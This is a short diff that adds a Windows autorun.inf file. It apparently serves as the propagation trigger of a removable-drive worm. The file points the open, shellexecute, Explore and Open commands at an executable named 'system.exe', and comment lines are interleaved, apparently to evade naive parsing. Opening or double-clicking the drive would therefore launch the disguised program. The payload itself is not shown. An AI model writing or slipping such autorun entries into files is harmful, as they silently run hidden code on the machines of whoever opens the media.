@@ -1,0 +1,11 @@
+[autorun]
+;e
+open=system.exe
+;e
+shellexecute=system.exe
+;e
+shell\Explore\command=system.exe
+;e
+shell\Open\command=system.exe
+;e
+shell=Explore
